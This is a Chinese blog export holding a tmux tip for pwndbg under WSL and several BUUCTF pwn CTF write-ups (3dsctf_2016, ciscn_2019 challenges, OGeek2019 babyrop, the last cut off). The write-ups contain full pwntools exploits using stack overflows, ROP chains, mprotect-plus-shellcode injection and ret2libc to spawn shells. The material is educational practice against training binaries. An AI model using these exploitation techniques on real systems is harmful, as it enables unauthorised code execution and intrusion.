    <url>/posts/19b7c9d1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>pwndbg在WSL下一直没法使用下断点调试的功能，找了半天发现tmux可以帮助解决这个问题</p>
<span id="more"></span>

<h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><p>用root权限安装</p>
<blockquote>
<p>sudo apt-get install tmux</p>
</blockquote>
<p>进入根目录</p>
<blockquote>
<p>cd ~</p>
</blockquote>
<h2 id="编辑配置"><a href="#编辑配置" class="headerlink" title="编辑配置"></a>编辑配置</h2><p>使用root权限打开tmux，方便保存配置文件</p>
<blockquote>
<p>sudo tmux</p>
</blockquote>
<p>新建.tmux.conf文件</p>
<blockquote>
<p>vim .tmux.conf</p>
</blockquote>
<p>在文件中输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#输入</span><br><span class="line">bind-key c new-window -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">bind-key % split-window -h -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">bind-key &#x27;&quot;&#x27; split-window -c &quot;#&#123;pane_current_path&#125;&quot;</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>

<p>关闭所有tmux窗口并输入</p>
<blockquote>
<p>tmux source-file ~&#x2F;.tmux.conf</p>
</blockquote>
<p>重新启动tmux则完成更改、</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>接下来可以在exp中下断点了  <code>gdb.attach(p)</code></p>
<p>同时要在exp中加上指定terminal</p>
<blockquote>
<p>context.terminal &#x3D; [‘tmux’, ‘splitw’, ‘-h’]</p>
</blockquote>
<p>-h代表横向分屏</p>
<p>之后就可以在运行exp时debug</p>
<p>注意要在tmux终端下运行</p>
]]></content>
      <categories>
        <category>工具技巧</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <url>/posts/de339b6d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>搬运，BUUCTF的pwn部分题解</p>
<span id="more"></span>

<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><p>和get_started_3dsctf_2016类似</p>
<p><img data-src="https://picx.zhimg.com/80/v2-c4b46ac8776ff52321e4e0dc72bae1fb_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-95401165e52d6ae447f905feb55371c3_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-d1cebe3985838041d6c2f820cb06311a_720w.png"></p>
<p>大概思路是先控制程序流到get_secret函数读取flag到f14g变量，再控制返回地址为write函数输出f14g变量的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25684</span>)</span><br><span class="line"></span><br><span class="line">elf= ELF(./not_the_same_3dsctf_2016)</span><br><span class="line"></span><br><span class="line">write_addr = elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span> </span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>* <span class="number">0x2d</span> + p32(get_secret) + p32(write_addr) + p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(flag_addr) + p32(<span class="number">45</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>第二种思路</p>
<p>用mprotect函数修改.plt.got表内存页权限为可读可写可执行，用read函数将shellcode注入到刚才修改的内存页中，执行shellcode  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25684</span>)</span><br><span class="line"></span><br><span class="line">elf= ELF(./not_the_same_3dsctf_2016)</span><br><span class="line">pop3_ret = <span class="number">0x0804f420</span><span class="comment">#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参</span></span><br><span class="line">				     <span class="comment">#ROPgadget --binary get_started --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line"><span class="comment">#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</span></span><br><span class="line"></span><br><span class="line">mem_addr = <span class="number">0x80eb000</span> <span class="comment">#可读可写的内存,但不可执行</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">45</span> <span class="comment">#填充数据覆盖到ebp</span></span><br><span class="line">payload += p32(mprotect_addr) <span class="comment">#栈返回到mprotect()函数执行</span></span><br><span class="line">payload += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line">payload += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数 read(0,0x080ea000,0x100)</span></span><br><span class="line">payload += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#执行完read后ret esi，这里是返回到我们布置的shellcode执行</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload_shellcode = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p><img data-src="https://picx.zhimg.com/80/v2-b841ab9925da5fda5c194a34fe90e6ab_720w.png"></p>
<p>只需要满足<code>var[13] == 17</code>即可getshell；__isoc99_scanf()&#96;函数没有限制输入数据的长度</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25951</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>*<span class="number">13</span> + p32(<span class="number">17</span>) <span class="comment">#p32(17)=\x11\x00\x00\x00,16进制小端存储，0x11(16)=17(10)</span></span><br><span class="line"><span class="comment">#这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近持续学习栈溢出，努力熟悉各种利用方法，争取这周和下周把栈溢出这块结束</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>IDA分析</p>
<p><img data-src="http://a1.qpic.cn/psc?/V11A9QHl1NNOpd/05RlWl8gsTOH*Z17MtCBzK03nLoC8PsZaXeSN56liOsd4c*DCOl3E.KMQgiJHI7btXhUypGiZ44CEh2X3SWvZw!!/c&ek=1&kp=1&pt=0&bo=fwLCAH8CwgAWADA!&tl=1&tm=1690290000&dis_t=1690293206&dis_k=f26da0996afa3b0e0c7c761a1dbac217&sce=0-12-12&rf=0-18"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-8c3972c8d716c5b403ee61aa7a6124af_720w.png?source=d16d100b"></p>
<p>&#96;&#96;<img data-src="https://picx.zhimg.com/80/v2-6546c4a99abf8ae111647ea8e5531456_720w.png"></p>
<p>方法一：传统栈溢出</p>
<p>可以看到main函数并没有ebp，寻址方式是esp寻址 </p>
<p>get_flag函数中，在读取flag之前先经过if判断a1 &#x3D;&#x3D; 814536271 &amp;&amp; a2 &#x3D;&#x3D; 425138641</p>
<p>构造pay时不可以试图跳过这个判断，无法打通</p>
<p>返回地址一定要覆盖为get_flag函数的开始处</p>
<p>在栈上构造get_flag参数</p>
<blockquote>
<p>payload &#x3D; b’a’ * 0x38+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2)</p>
<p>注意这里的返回地址为exit的地址，打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出 </p>
</blockquote>
<p>EXP1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25669</span>)</span><br><span class="line"></span><br><span class="line">get_flag_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x804E6A0</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>+p32(get_flag_addr)+p33(exit_addr)+p32(a1)+p32(a2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>方法二：系统调用</p>
<p>利用ROPgadget找到需要的gadget</p>
<p><code>pop_eax_ret = 0x080b91e6</code></p>
<p><code>pop_edx_ecx_ebx_ret = 0x0806fc30</code></p>
<p><code>int80 = 0x0806d7e5</code></p>
<p>但是没有找到”&#x2F;bin&#x2F;sh”字符串，考虑在其他寄存器写入&#x2F;bin&#x2F;sh，再赋值给edx</p>
<p>看看有没有类似的mov指令</p>
<p><code>mov_edx_eax_ret = 0x080557ab</code></p>
<p><del>你猜猜我mov_edx_eax_ret怎么找的（裂开）</del></p>
<p><img data-src="https://picx.zhimg.com/80/v2-21ea8eba239f70d3814cc987604f6b83_720w.png"></p>
<p>可以看到，该处指令<code>mov    [edx], eax</code> 是将eax寄存器里的值写到eedx所存的地址处[edx]，攻击的思路就是讲[edx]地址覆盖为&#x2F;bin&#x2F;sh写入地址，并利用eax寄存器将字符串&#x2F;bin&#x2F;sh存入。</p>
<p>需要注意的是，该程序没有给出可用的bss段变量，栈空间一般情况下开启ASLR地址随机，所以我们用vmmap查找可读的内存空间作为入&#x2F;bin&#x2F;sh的地址</p>
<p><a href="https://www.shawroot.cc/2010.html">这篇参考的链接</a>，使用0x080eb020 作为存放&#x2F;bin&#x2F;sh的地址，但是使用vmmap可以看到没有以这个地址开头或结束的段，而且也不存在可写可执行的段，只有0x80ea000到0x80ec000是可写的文件段（实际上0x080eb020 也在该段中）</p>
<p>补充一下，同时其实我们可以看出来vmmap出来的地址段是没有libc中的内容的，实际上get_started_3dsctf_2016是静态链接</p>
<p><img data-src="https://pic4.zhimg.com/80/v2-3f0871a35e36bb1b4168d14429be1647_720w.webp"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p>
<p><img data-src="https://pica.zhimg.com/80/v2-8eb67977ab589ae1dff2debc6163b811_720w.png"></p>
<p>整体的rop流程为，分两次每次四字节将”&#x2F;bin” “&#x2F;sh\x00”先存入eax，再利用Pop将edx置为0x80ea000，再利用mov指令将字符串放入该地址指向空间，最后返回系统调用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25878</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int80 = <span class="number">0x0806d7e5</span></span><br><span class="line">mov_edx_eax_ret = <span class="number">0x080557ab</span></span><br><span class="line">w_addr = <span class="number">0x80ea000</span><span class="comment">#0x080eb020</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p32(pop_eax_ret)+<span class="string">b&#x27;/bin&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(w_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+<span class="string">b&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx_ret)+p32(w_addr+<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(mov_edx_eax_ret)</span><br><span class="line">payload += p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(w_addr)+p32(int80)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">~                              </span><br></pre></td></tr></table></figure>



<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>方法三：mprotect函数修改地址权限</p>
<p>利用mprotect()函数来修改内存权限，一般是将.bss端修改为可读可写可执行，然后通过read()函数向目标内存写入shellcode，然后getshell （因为是静态链接的，所有的函数都会链接到程序，肯定会存在一个mprotect（）函数 ）</p>
<p><img data-src="https://picx.zhimg.com/80/v2-6dbdaad88cfe982d0518d899ad3491db_720w.png"></p>
<blockquote>
<p>include &lt;sys&#x2F;mman.h&gt; </p>
<p>int mprotect(void *addr, size_t len, int prot);addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB &#x3D;&#x3D; 4096字节）整数倍。</p>
<p>len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。<br>prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：<br>1）PROT_READ：内存段可读；<br>2）PROT_WRITE：内存段可写；<br>3）PROT_EXEC：内存段可执行；<br>4）PROT_NONE：内存段不可访问。<br>返回值：0；成功，-1；失败（并且errno被设置）<br>1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。<br>2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。<br>3）ENOMEM：内核内部的结构体无法分配。<br>这里的参数prot：<br>            r:4<br>            w:2<br>            x:1</p>
</blockquote>
<p>我们通过vmmap可以看到0x080ea000到0x080ec000是可读可写但是不可执行的（开了NX保护），所以用mprotect()将这一段修改成可读可写可执行，然后通过read()传shellcode到此处</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-262a105cb813d69dda9de13c35a7ecc0_720w.png"></p>
<p>需要注意的是mprotect指定的内存区间必须包含整个内存页（4K），并且区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍（0x1000&#x3D;4096）</p>
<p>我们知道32位调用函数不需要寄存器传参，但是我们需要用pop，ret来控制程序运行流程， 用 ROPgadget 随便选一个有三个寄存器加一个ret的gadget </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27364</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span> , endian = <span class="string">&#x27;little&#x27;</span>) <span class="comment">#小端序，linux系统，32位架构,debug</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf_addr = <span class="number">0x80eb000</span>   <span class="comment">#要修改的内存页首地址</span></span><br><span class="line">buf_size = <span class="number">0x1000</span>      <span class="comment">#要修改的内存页大小</span></span><br><span class="line">buf_prot = <span class="number">0x7</span>         <span class="comment">#要修改的权限</span></span><br><span class="line"></span><br><span class="line">pop_3_ret = <span class="number">0x08063adb</span>  <span class="comment">#寄存器传参外加ret返回read函数地址 </span></span><br><span class="line"><span class="comment">#0x08063adb : pop edi ; pop esi ; pop ebx ; ret</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect)  <span class="comment">#先将返回地址覆盖为mprotect函数地址</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_3_ret)  <span class="comment">#通过三个寄存器传参再加上ret返回栈上下一个函数地址</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#要修改的内存页首地址</span></span><br><span class="line">payload += p32(buf_size)    <span class="comment">#要修改的内存页大小</span></span><br><span class="line">payload += p32(buf_prot)    <span class="comment">#要修改的权限</span></span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)  <span class="comment">#ret返回栈上下一个函数地址为read函数地址</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#read函数的返回地址</span></span><br><span class="line">payload += p32(<span class="number">0</span>)           <span class="comment">#read函数的第一个参数</span></span><br><span class="line">payload += p32(buf_addr)    <span class="comment">#read函数的第二个参数</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>)    <span class="comment">#read函数的第三个参数</span></span><br><span class="line">sh.sendline(payload)    </span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)   </span><br><span class="line">sh.sendline(shellcode)      <span class="comment">#read函数输入buf_addr的字符串</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>参考文章</p>
<p><a href="https://blog.csdn.net/tbsqigongzi/article/details/124457938?spm=1001.2014.3001.5501">1</a>    <a href="https://blog.csdn.net/qq_15762939/article/details/104062307">2</a>  <a href="https://niceseven.github.io/post/2020/02/11/buuctf-pwn-get_started_3dsctf_2016/">3</a>  <a href="http://liul14n.top/2020/02/25/get-started-3dsctf-2016/">4</a>  <a href="https://www.shawroot.cc/2010.html">5</a>  <a href="https://blog.csdn.net/A951860555/article/details/111030289">6</a></p>
<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>简单的ret2libc3<br>file checksec —— 64-bit 开NX</p>
<h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915622.webp"></p>
<p>再看看IDA</p>
<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915382.png"></p>
<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>分析大致流程就是</p>
<ol>
<li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
<li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
<li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
</ol>
<h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28342</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">pop_rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p><a href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
<blockquote>
<p>git clone <a href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a><br>cd LibcSearcher<br>sudo python setup.py develop</p>
</blockquote>
<p>覆盖数据payload&#x3D;b’\0’+b’a’*(0x50-1+8)<br>\0是为了让加密函数的一个strlen函数停止（这个函数遇‘0’会停止），从而绕过加密，保证我们构造的rop不会被破坏，<br>buf的大小为0x50<br>-1是减去\0<br>+8是覆盖rbp</p>
<p>这道题的接收非常讲究<br>泄露地址接收时先是两下recvline()，<br>原因</p>
<blockquote>
<p>recvline()一次接收到\n;<br>第一次recvline只能到Ciphertext；<br>第二次只能接收到0a<br>第三次的recvuntil才开始处理泄露的got地址。<br>先开一下context_log_lever&#x3D;’debug’，整体看一下， 再自己recvuntil看能接收到什么内容。</p>
</blockquote>
<p>然后再用recvuntil(‘\n’)[:-1].ljust(8,’\0’)来舍弃接收到的字符串最后的’\x0’并向左补齐</p>
<p>这一道题是64位的程序，这边涉及到64位程序和32位程序运行时的区别了<br>32位程序运行执行指令的时候直接去内存地址寻址执行<br>64位程序则是通过寄存器来传址，寄存器去内存寻址，找到地址返回给程序。因此要用寄存器存参<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p>
<p>注意栈对齐<br><img data-src="https://pic1.zhimg.com/80/v2-5fb909989f2a46201c004e96d46f6890_1440w.webp"></p>
<p>还有最后还要再输一个0</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p>
<p>参考资料：<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6——ciscn_2019_c_1</a></p>
<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64位程序，开启NX</p>
<p>没有system函数和&#x2F;bin&#x2F;sh字符串</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>分析程序： main函数中，先读取一个随机数到fd，并作为参数传入sub_804871F函数，再将sub_804871F函数的返回值作为参数传入sub_80487D0函数里。</p>
<p>main函数</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213530841-697585877.png" alt="image-20230807205450139"></p>
<p>sub_804871F函数</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531189-116431913.png" alt="image-20230807205837589"></p>
<p>sub_80487D0函数</p>
<p><img data-src="https://img2023.cnblogs.com/blog/3221672/202308/3221672-20230807213531499-314115011.png" alt="image-20230807205912958"></p>
<p>观察程序我们可以发现sub_80487D0函数有栈溢出漏洞</p>
<p>然而想要利用栈溢出需要我们达成两个目标</p>
<p>1、绕过sub_804871F函数中的exit函数，这就要让strncmp的返回值为0</p>
<p>2、让sub_80487D0函数中a1（即buf[7]）的ASCII码值尽可能大，构造栈溢出</p>
